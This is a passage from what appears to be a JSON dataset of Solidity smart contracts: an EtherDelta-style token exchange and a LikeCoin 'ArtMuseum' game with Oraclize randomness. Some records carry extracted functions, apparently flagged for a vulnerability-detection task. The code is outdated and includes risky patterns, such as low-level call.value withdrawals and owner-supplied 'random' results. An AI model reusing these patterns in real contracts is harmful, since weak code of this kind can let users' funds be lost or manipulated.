{}\n}\ncontract AccountLevelsTest is AccountLevels {\n mapping (address => uint) public accountLevels;\n function setAccountLevel(address user, uint level) {\n accountLevels[user] = level;\n }\n function accountLevel(address user) constant returns(uint) {\n return accountLevels[user];\n }\n}\ncontract AZExchange is SafeMath {\n address public admin;\n address public feeAccount;\n address public accountLevelsAddr;\n uint public feeMake;\n uint public feeTake;\n uint public feeRebate;\n mapping (address => mapping (address => uint)) public tokens;\n mapping (address => mapping (bytes32 => bool)) public orders;\n mapping (address => mapping (bytes32 => uint)) public orderFills;\n event Order(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user);\n event Cancel(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s);\n event Trade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, address get, address give);\n event Deposit(address token, address user, uint amount, uint balance);\n event Withdraw(address token, address user, uint amount, uint balance);\n function AZExchange(address admin_, address feeAccount_, address accountLevelsAddr_, uint feeMake_, uint feeTake_, uint feeRebate_) {\n admin = admin_;\n feeAccount = feeAccount_;\n accountLevelsAddr = accountLevelsAddr_;\n feeMake = feeMake_;\n feeTake = feeTake_;\n feeRebate = feeRebate_;\n }\n function() {\n throw;\n }\n function changeAdmin(address admin_) {\n if (msg.sender != admin) throw;\n admin = admin_;\n }\n function changeAccountLevelsAddr(address accountLevelsAddr_) {\n if (msg.sender != admin) throw;\n accountLevelsAddr = accountLevelsAddr_;\n }\n function changeFeeAccount(address feeAccount_) {\n if (msg.sender != admin) throw;\n feeAccount = feeAccount_;\n }\n function changeFeeMake(uint feeMake_) {\n if (msg.sender != admin) throw;\n feeMake = feeMake_;\n }\n function changeFeeTake(uint feeTake_) {\n if (msg.sender != admin) throw;\n if (feeTake_ < feeRebate) throw;\n feeTake = feeTake_;\n }\n function changeFeeRebate(uint feeRebate_) {\n if (msg.sender != admin) throw;\n if (feeRebate_ > feeTake) throw;\n feeRebate = feeRebate_;\n }\n function deposit() payable {\n tokens[0][msg.sender] = safeAdd(tokens[0][msg.sender], msg.value);\n Deposit(0, msg.sender, msg.value, tokens[0][msg.sender]);\n }\n function withdraw(uint amount) {\n if (tokens[0][msg.sender] < amount) throw;\n tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], amount);\n if (!msg.sender.call.value(amount)()) throw;\n Withdraw(0, msg.sender, amount, tokens[0][msg.sender]);\n }\n function depositToken(address token, uint amount) {\n if (token==0) throw;\n if (!Token(token).transferFrom(msg.sender, this, amount)) throw;\n tokens[token][msg.sender] = safeAdd(tokens[token][msg.sender], amount);\n Deposit(token, msg.sender, amount, tokens[token][msg.sender]);\n }\n function withdrawToken(address token, uint amount) {\n if (token==0) throw;\n if (tokens[token][msg.sender] < amount) throw;\n tokens[token][msg.sender] = safeSub(tokens[token][msg.sender], amount);\n if (!Token(token).transfer(msg.sender, amount)) throw;\n Withdraw(token, msg.sender, amount, tokens[token][msg.sender]);\n }\n function balanceOf(address token, address user) constant returns (uint) {\n return tokens[token][user];\n }\n function order(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce) {\n bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\n orders[msg.sender][hash] = true;\n Order(tokenGet, amountGet, tokenGive, amountGive, expires, nonce, msg.sender);\n }\n function trade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s, uint amount) {\n bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\n if (!(\n (orders[user][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == user) &&\n block.number <= expires &&\n safeAdd(orderFills[user][hash], amount) <= amountGet\n )) throw;\n tradeBalances(tokenGet, amountGet, tokenGive, amountGive, user, amount);\n orderFills[user][hash] = safeAdd(orderFills[user][hash], amount);\n Trade(tokenGet, amount, tokenGive, amountGive * amount / amountGet, user, msg.sender);\n }\n function tradeBalances(address tokenGet, uint amountGet, address tokenGive, uint amountGive, address user, uint amount) private {\n uint feeMakeXfer = safeMul(amount, feeMake) / (1 ether);\n uint feeTakeXfer = safeMul(amount, feeTake) / (1 ether);\n uint feeRebateXfer = 0;\n if (accountLevelsAddr != 0x0) {\n uint accountLevel = AccountLevels(accountLevelsAddr).accountLevel(user);\n if (accountLevel==1) feeRebateXfer = safeMul(amount, feeRebate) / (1 ether);\n if (accountLevel==2) feeRebateXfer = feeTakeXfer;\n }\n tokens[tokenGet][msg.sender] = safeSub(tokens[tokenGet][msg.sender], safeAdd(amount, feeTakeXfer));\n tokens[tokenGet][user] = safeAdd(tokens[tokenGet][user], safeSub(safeAdd(amount, feeRebateXfer), feeMakeXfer));\n tokens[tokenGet][feeAccount] = safeAdd(tokens[tokenGet][feeAccount], safeSub(safeAdd(feeMakeXfer, feeTakeXfer), feeRebateXfer));\n tokens[tokenGive][user] = safeSub(tokens[tokenGive][user], safeMul(amountGive, amount) / amountGet);\n tokens[tokenGive][msg.sender] = safeAdd(tokens[tokenGive][msg.sender], safeMul(amountGive, amount) / amountGet);\n }\n function testTrade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s, uint amount, address sender) constant returns(bool) {\n if (!(\n tokens[tokenGet][sender] >= amount &&\n availableVolume(tokenGet, amountGet, tokenGive, amountGive, expires, nonce, user, v, r, s) >= amount\n )) return false;\n return true;\n }\n function availableVolume(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s) constant returns(uint) {\n bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\n if (!(\n (orders[user][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == user) &&\n block.number <= expires\n )) return 0;\n uint available1 = safeSub(amountGet, orderFills[user][hash]);\n uint available2 = safeMul(tokens[tokenGive][user], amountGet) / amountGive;\n if (available1<available2) return available1;\n return available2;\n }\n function amountFilled(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s) constant returns(uint) {\n bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\n return orderFills[user][hash];\n }\n function cancelOrder(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, uint8 v, bytes32 r, bytes32 s) {\n bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\n if (!(orders[msg.sender][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == msg.sender)) throw;\n orderFills[msg.sender][hash] = amountGet;\n Cancel(tokenGet, amountGet, tokenGive, amountGive, expires, nonce, msg.sender, v, r, s);\n }\n}",
  "extract_feature": [
    "function trade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s, uint amount) {\nbytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\nif (!(\n(orders[user][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == user) &&\nblock.number <= expires &&\nsafeAdd(orderFills[user][hash], amount) <= amountGet\n)) throw;\ntradeBalances(tokenGet, amountGet, tokenGive, amountGive, user, amount);\norderFills[user][hash] = safeAdd(orderFills[user][hash], amount);\nTrade(tokenGet, amount, tokenGive, amountGive * amount / amountGet, user, msg.sender);\n}",
    "function availableVolume(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s) constant returns(uint) {\nbytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\nif (!(\n(orders[user][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == user) &&\nblock.number <= expires\n)) return 0;\nuint available1 = safeSub(amountGet, orderFills[user][hash]);\nuint available2 = safeMul(tokens[tokenGive][user], amountGet) / amountGive;\nif (available1<available2) return available1;\nreturn available2;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b5d"
  },
  "filename": "2859.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Ownable {\n address public owner;\n address public pendingOwner;\n address public operator;\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n modifier onlyPendingOwner() {\n require(msg.sender == pendingOwner);\n _;\n }\n modifier ownerOrOperator {\n require(msg.sender == owner || msg.sender == operator);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n pendingOwner = newOwner;\n }\n function claimOwnership() onlyPendingOwner public {\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n }\n function setOperator(address _operator) onlyOwner public {\n operator = _operator;\n }\n}\ncontract LikeCoinInterface {\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n}\ncontract ArtMuseumBase is Ownable {\n struct Artwork {\n uint8 artworkType;\n uint32 sequenceNumber;\n uint128 value;\n address player;\n }\n LikeCoinInterface public like;\n uint32[] public ids;\n uint32 public lastId;\n uint32 public oldest;\n mapping(uint32 => Artwork) artworks;\n mapping(address=>mapping(uint8 => uint32)) userArtworkSequenceNumber;\n uint128[] public costs;\n uint128[] public values;\n uint8 public fee;\n uint32 public numArtworks;\n uint16 public maxArtworks;\n uint32[] numArtworksXType;\n function init(address _likeAddr) public onlyOwner {\n require(like==address(0));\n like = LikeCoinInterface(_likeAddr);\n costs = [800 ether, 2000 ether, 5000 ether, 12000 ether, 25000 ether];\n setFee(5);\n maxArtworks = 1000;\n lastId = 1;\n oldest = 0;\n }\n function deposit() payable public {\n }\n function withdrawBalance() public onlyOwner returns(bool res) {\n owner.transfer(address(this).balance);\n return true;\n }\n function collectFees(uint128 amount) public onlyOwner {\n uint collectedFees = getFees();\n if (amount <= collectedFees) {\n like.transfer(owner,amount);\n }\n }\n function getArtwork(uint32 artworkId) public constant returns(uint8 artworkType, uint32 sequenceNumber, uint128 value, address player) {\n return (artworks[artworkId].artworkType, artworks[artworkId].sequenceNumber, artworks[artworkId].value, artworks[artworkId].player);\n }\n function getAllArtworks() public constant returns(uint32[] artworkIds,uint8[] types,uint32[] sequenceNumbers, uint128[] artworkValues) {\n uint32 id;\n artworkIds = new uint32[](numArtworks);\n types = new uint8[](numArtworks);\n sequenceNumbers = new uint32[](numArtworks);\n artworkValues = new uint128[](numArtworks);\n for (uint16 i = 0; i < numArtworks; i++) {\n id = ids[i];\n artworkIds[i] = id;\n types[i] = artworks[id].artworkType;\n sequenceNumbers[i] = artworks[id].sequenceNumber;\n artworkValues[i] = artworks[id].value;\n }\n }\n function getAllArtworksByOwner() public constant returns(uint32[] artworkIds,uint8[] types,uint32[] sequenceNumbers, uint128[] artworkValues) {\n uint32 id;\n uint16 j = 0;\n uint16 howmany = 0;\n address player = address(msg.sender);\n for (uint16 k = 0; k < numArtworks; k++) {\n if (artworks[ids[k]].player == player)\n howmany++;\n }\n artworkIds = new uint32[](howmany);\n types = new uint8[](howmany);\n sequenceNumbers = new uint32[](howmany);\n artworkValues = new uint128[](howmany);\n for (uint16 i = 0; i < numArtworks; i++) {\n if (artworks[ids[i]].player == player) {\n id = ids[i];\n artworkIds[j] = id;\n types[j] = artworks[id].artworkType;\n sequenceNumbers[j] = artworks[id].sequenceNumber;\n artworkValues[j] = artworks[id].value;\n j++;\n }\n }\n }\n function setCosts(uint128[] _costs) public onlyOwner {\n require(_costs.length >= costs.length);\n costs = _costs;\n setFee(fee);\n }\n function setFee(uint8 _fee) public onlyOwner {\n fee = _fee;\n for (uint8 i = 0; i < costs.length; i++) {\n if (i < values.length)\n values[i] = costs[i] - costs[i] / 100 * fee;\n else {\n values.push(costs[i] - costs[i] / 100 * fee);\n numArtworksXType.push(0);\n }\n }\n }\n function getFees() public constant returns(uint) {\n uint reserved = 0;\n for (uint16 j = 0; j < numArtworks; j++)\n reserved += artworks[ids[j]].value;\n return like.balanceOf(this) - reserved;\n }\n function getNumArtworksXType() public constant returns(uint32[] _numArtworksXType) {\n _numArtworksXType = numArtworksXType;\n }\n}\npragma solidity ^0.4.20;\ncontract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) external payable returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) external payable returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) public payable returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) external payable returns (bytes32 _id);\n function queryN(uint _timestamp, string _datasource, bytes _argN) public payable returns (bytes32 _id);\n function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) external payable returns (bytes32 _id);\n function getPrice(string _datasource) public returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) public returns (uint _dsprice);\n function setProofType(byte _proofType) external;\n function setCustomGasPrice(uint _gasPrice) external;\n function randomDS_getSessionPubKeyHash() external constant returns(bytes32);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() public returns (address _addr);\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofType_Android = 0x20;\n byte constant proofType_Ledger = 0x30;\n byte constant proofType_Native = 0xF0;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n string oraclize_network_name;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n if((address(OAR)==0)||(getCodeSize(address(OAR))==0))\n oraclize_setNetwork(networkID_auto);\n if(address(oraclize) != OAR.getAddress())\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n return oraclize_setNetwork();\n networkID;\n }\n function oraclize_setNetwork() internal returns(bool){\n if (getCodeSize(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed);\n oraclize_setNetworkName(\"eth_mainnet\");\n return true;\n }\n if (getCodeSize(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1)>0){\n OAR = OraclizeAddrResolverI(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1);\n oraclize_setNetworkName(\"eth_ropsten3\");\n return true;\n }\n if (getCodeSize(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e)>0){\n OAR = OraclizeAddrResolverI(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e);\n oraclize_setNetworkName(\"eth_kovan\");\n return true;\n }\n if (getCodeSize(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48)>0){\n OAR = OraclizeAddrResolverI(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48);\n oraclize_setNetworkName(\"eth_rinkeby\");\n return true;\n }\n if (getCodeSize(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475)>0){\n OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);\n return true;\n }\n if (getCodeSize(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF)>0){\n OAR = OraclizeAddrResolverI(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF);\n return true;\n }\n if (getCodeSize(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA)>0){\n OAR = OraclizeAddrResolverI(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA);\n return true;\n }\n return false;\n }\n function oraclize_getPrice(string datasource) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource);\n }\n function oraclize_getPrice(string datasource, uint gaslimit) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource, gaslimit);\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal {\n return oraclize.setCustomGasPrice(gasPrice);\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseInt(string _a) internal pure returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal pure returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n if (_b > 0) mint *= 10**_b;\n return mint;\n }\n function oraclize_setNetworkName(string _network_name) internal {\n oraclize_network_name = _network_name;\n }\n function oraclize_getNetworkName() internal view returns (string) {\n return oraclize_network_name;\n }\n}\nlibrary strings {\n struct slice {\n uint _len;\n uint _ptr;\n }\n function memcpy(uint dest, uint src, uint len) private pure {\n for(; len >= 32; len -= 32) {\n assembly {\n mstore(dest, mload(src))\n }\n dest += 32;\n src += 32;\n }\n uint mask = 256 ** (32 - len) - 1;\n assembly {\n let srcpart := and(mload(src), not(mask))\n let destpart := and(mload(dest), mask)\n mstore(dest, or(destpart, srcpart))\n }\n }\n function toSlice(string self) internal pure returns (slice) {\n uint ptr;\n assembly {\n ptr := add(self, 0x20)\n }\n return slice(bytes(self).length, ptr);\n }\n function toString(slice self) internal pure returns (string) {\n string memory ret = new string(self._len);\n uint retptr;\n assembly { retptr := add(ret, 32) }\n memcpy(retptr, self._ptr, self._len);\n return ret;\n }\n function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\n uint ptr = selfptr;\n uint idx;\n if (needlelen <= selflen) {\n if (needlelen <= 32) {\n bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\n bytes32 needledata;\n assembly { needledata := and(mload(needleptr), mask) }\n uint end = selfptr + selflen - needlelen;\n bytes32 ptrdata;\n assembly { ptrdata := and(mload(ptr), mask) }\n while (ptrdata != needledata) {\n if (ptr >= end)\n return selfptr + selflen;\n ptr++;\n assembly { ptrdata := and(mload(ptr), mask) }\n }\n return ptr;\n } else {\n bytes32 hash;\n assembly { hash := sha3(needleptr, needlelen) }\n for (idx = 0; idx <= selflen - needlelen; idx++) {\n bytes32 testHash;\n assembly { testHash := sha3(ptr, needlelen) }\n if (hash == testHash)\n return ptr;\n ptr += 1;\n }\n }\n }\n return selfptr + selflen;\n }\n function split(slice self, slice needle, slice token) internal pure returns (slice) {\n uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr);\n token._ptr = self._ptr;\n token._len = ptr - self._ptr;\n if (ptr == self._ptr + self._len) {\n self._len = 0;\n } else {\n self._len -= token._len + needle._len;\n self._ptr = ptr + needle._len;\n }\n return token;\n }\n function split(slice self, slice needle) internal pure returns (slice token) {\n split(self, needle, token);\n }\n function count(slice self, slice needle) internal pure returns (uint cnt) {\n uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr) + needle._len;\n while (ptr <= self._ptr + self._len) {\n cnt++;\n ptr = findPtr(self._len - (ptr - self._ptr), ptr, needle._len, needle._ptr) + needle._len;\n }\n }\n}\ncontract ArtMuseumV1 is ArtMuseumBase, usingOraclize {\n using strings for *;\n uint32 public lastcombo;\n uint public lastStealBlockNumber;\n uint8[] public oldestExtraStealProbability;\n string randomQuery;\n string queryType;\n uint public nextStealTimestamp;\n uint32 public oraclizeGas;\n uint32 public oraclizeGasExtraArtwork;\n uint32 public etherExchangeLikeCoin;\n bytes32 nextStealId;\n uint8 public numOfTimesSteal;\n uint public oraclizeFee;\n event newPurchase(address player, uint32 startId, uint8[] artworkTypes, uint32[] startSequenceNumbers);\n event newSteal(uint timestamp,uint32[] stolenArtworks,uint8[] artworkTypes,uint32[] sequenceNumbers, uint256[] values,address[] players);\n event newStealRewards(uint128 total,uint128[] values);\n event newSell(uint32[] artworkId, address player, uint256 value);\n event newTriggerOraclize(bytes32 nextStealId, uint waittime, uint gasAmount, uint price, uint balancebefore, uint balance);\n event newOraclizeCallback(bytes32 nextStealId, string result, uint32 killed, uint128 killedValue, uint128 distValue,uint oraclizeFee,uint gaslimit,uint exchange);\n function initOraclize() public onlyOwner {\n if((address(OAR)==0)||(getCodeSize(address(OAR))==0))\n oraclize_setNetwork();\n }\n function init1() public onlyOwner {\n randomQuery = \"10 random numbers between 1 and 100000\";\n queryType = \"WolframAlpha\";\n oraclizeGas = 150000;\n oraclizeGasExtraArtwork = 14000;\n etherExchangeLikeCoin = 50000;\n oldestExtraStealProbability = [3,5,10,15,30,50];\n numOfTimesSteal = 1;\n }\n function giveArtworks(uint8[] artworkTypes, address receiver, uint256 _value) internal {\n uint32 len = uint32(artworkTypes.length);\n require(numArtworks + len < maxArtworks);\n uint256 amount = 0;\n for (uint16 i = 0; i < len; i++) {\n require(artworkTypes[i] < costs.length);\n amount += costs[artworkTypes[i]];\n }\n require(_value >= amount);\n uint8 artworkType;\n uint32[] memory seqnolist = new uint32[](len);\n for (uint16 j = 0; j < len; j++) {\n if (numArtworks < ids.length)\n ids[numArtworks] = lastId;\n else\n ids.push(lastId);\n artworkType = artworkTypes[j];\n userArtworkSequenceNumber[receiver][artworkType]++;\n seqnolist[j] = userArtworkSequenceNumber[receiver][artworkType];\n artworks[lastId] = Artwork(artworkTypes[j], userArtworkSequenceNumber[receiver][artworkType], values[artworkType], receiver);\n numArtworks++;\n lastId++;\n numArtworksXType[artworkType]++;\n }\n emit newPurchase(receiver, lastId - len, artworkTypes, seqnolist);\n }\n function replaceArtwork(uint16 index) internal {\n uint32 artworkId = ids[index];\n numArtworksXType[artworks[artworkId].artworkType]--;\n numArtworks--;\n if (artworkId == oldest) oldest = 0;\n delete artworks[artworkId];\n if (numArtworks>0)\n ids[index] = ids[numArtworks];\n delete ids[numArtworks];\n ids.length = numArtworks;\n }\n function getOldest() public constant returns(uint32 artworkId,uint8 artworkType, uint32 sequenceNumber, uint128 value, address player) {\n if (numArtworks==0) artworkId = 0;\n else {\n artworkId = oldest;\n if (artworkId==0) {\n artworkId = ids[0];\n for (uint16 i = 1; i < numArtworks; i++) {\n if (ids[i] < artworkId)\n artworkId = ids[i];\n }\n }\n artworkType = artworks[artworkId].artworkType;\n sequenceNumber = artworks[artworkId].sequenceNumber;\n value = artworks[artworkId].value;\n player = artworks[artworkId].player;\n }\n }\n function setOldest() internal returns(uint32 artworkId,uint16 index) {\n if (numArtworks==0) artworkId = 0;\n else {\n if (oldest==0) {\n oldest = ids[0];\n index = 0;\n for (uint16 i = 1; i < numArtworks; i++) {\n if (ids[i] < oldest) {\n oldest = ids[i];\n index = i;\n }\n }\n } else {\n for (uint16 j = 0; j < numArtworks; j++) {\n if (ids[j] == oldest) {\n index = j;\n break;\n }\n }\n }\n artworkId = oldest;\n }\n }\n function sellArtwork(uint32 artworkId) public {\n require(msg.sender == artworks[artworkId].player);\n uint256 val = uint256(artworks[artworkId].value);\n uint16 artworkIndex;\n bool found = false;\n for (uint16 i = 0; i < numArtworks; i++) {\n if (ids[i] == artworkId) {\n artworkIndex = i;\n found = true;\n break;\n }\n }\n require(found == true);\n replaceArtwork(artworkIndex);\n if (val>0)\n like.transfer(msg.sender,val);\n uint32[] memory artworkIds = new uint32[](1);\n artworkIds[0] = artworkId;\n emit newSell(artworkIds, msg.sender, val);\n }\n function triggerStealManually(uint32 inseconds) public payable ownerOrOperator {\n require((nextStealTimestamp) < now);\n triggerSteal(inseconds, (oraclizeGas + oraclizeGasExtraArtwork * numArtworks));\n }\n function triggerStealManually2(string result) public payable ownerOrOperator {\n uint gaslimit = gasleft();\n oraclizeFee = (gaslimit) * tx.gasprice + oraclizeFee;\n require(nextStealTimestamp < now);\n uint32 howmany;\n uint128 pot;\n uint gasCost;\n uint128 distpot;\n uint oraclizeFeeTmp = 0;\n if (numArtworks<=1) {\n removeArtworksByString(\"\",0);\n distribute(0);\n oraclizeFeeTmp = oraclizeFee;\n } else {\n howmany = numArtworks < 100 ? (numArtworks < 10 ? (numArtworks < 2 ? 0 : 1) : numArtworks / 10) : 10;\n pot = removeArtworksByString(result,howmany);\n gasCost = ((oraclizeFee * etherExchangeLikeCoin) / 1 ether) * 1 ether;\n if (pot > gasCost)\n distpot = uint128(pot - gasCost);\n distribute(distpot);\n oraclizeFeeTmp = oraclizeFee;\n oraclizeFee = 0;\n }\n emit newOraclizeCallback(0x0,result,howmany,pot,distpot,oraclizeFeeTmp,gaslimit,etherExchangeLikeCoin);\n }\n function triggerStealManually3(string result,uint gaslimit) public payable ownerOrOperator {\n oraclizeFee = (gaslimit) * tx.gasprice + oraclizeFee;\n require(nextStealTimestamp < now);\n uint32 howmany;\n uint128 pot;\n uint gasCost;\n uint128 distpot;\n uint oraclizeFeeTmp = 0;\n if (numArtworks<=1) {\n removeArtworksByString(\"\",0);\n distribute(0);\n oraclizeFeeTmp = oraclizeFee;\n } else {\n howmany = numArtworks < 100 ? (numArtworks < 10 ? (numArtworks < 2 ? 0 : 1) : numArtworks / 10) : 10;\n pot = removeArtworksByString(result,howmany);\n gasCost = ((oraclizeFee * etherExchangeLikeCoin) / 1 ether) * 1 ether;\n if (pot > gasCost)\n distpot = uint128(pot - gasCost);\n distribute(distpot);\n oraclizeFeeTmp = oraclizeFee;\n oraclizeFee = 0;\n }\n emit newOraclizeCallback(0x0,result,howmany,pot,distpot,oraclizeFeeTmp,gaslimit,etherExchangeLikeCoin);\n }\n function timeTillNextSteal() constant internal returns(uint32) {\n return (86400 / (1 + numArtworks / 100)) / ( numOfTimesSteal );\n }\n function triggerSteal(uint32 inseconds, uint gasAmount) internal {\n uint gaslimit = gasleft();\n uint price = oraclize_getPrice(queryType, gasAmount);\n uint balancebefore = address(this).balance;\n require(price <= address(this).balance);\n if (numArtworks<=1) {\n removeArtworksByString(\"\",0);\n distribute(0);\n nextStealId = 0x0;\n price = 0;\n } else {\n nextStealId = oraclize_query(nextStealTimestamp, queryType, randomQuery, gasAmount);\n }\n emit newTriggerOraclize(nextStealId, inseconds, gasAmount, price, balancebefore, address(this).balance);\n oraclizeFee = price + (gaslimit-gasleft() + 200000 ) * tx.gasprice;\n }\n function findIndexFromRandomNumber(uint32 randomNumbers) internal returns (uint32 artworkId, uint16 index) {\n uint16 indexOldest;\n uint maxNumber;\n uint8 extraProbability;\n if (oldest==0)\n lastcombo = 0;\n (artworkId,indexOldest) = setOldest();\n if (lastcombo>oldestExtraStealProbability.length-1)\n extraProbability = oldestExtraStealProbability[oldestExtraStealProbability.length-1];\n else\n extraProbability = oldestExtraStealProbability[lastcombo];\n maxNumber = 100000 - extraProbability*1000;\n if (extraProbability>0 && randomNumbers>maxNumber) {\n index = indexOldest;\n 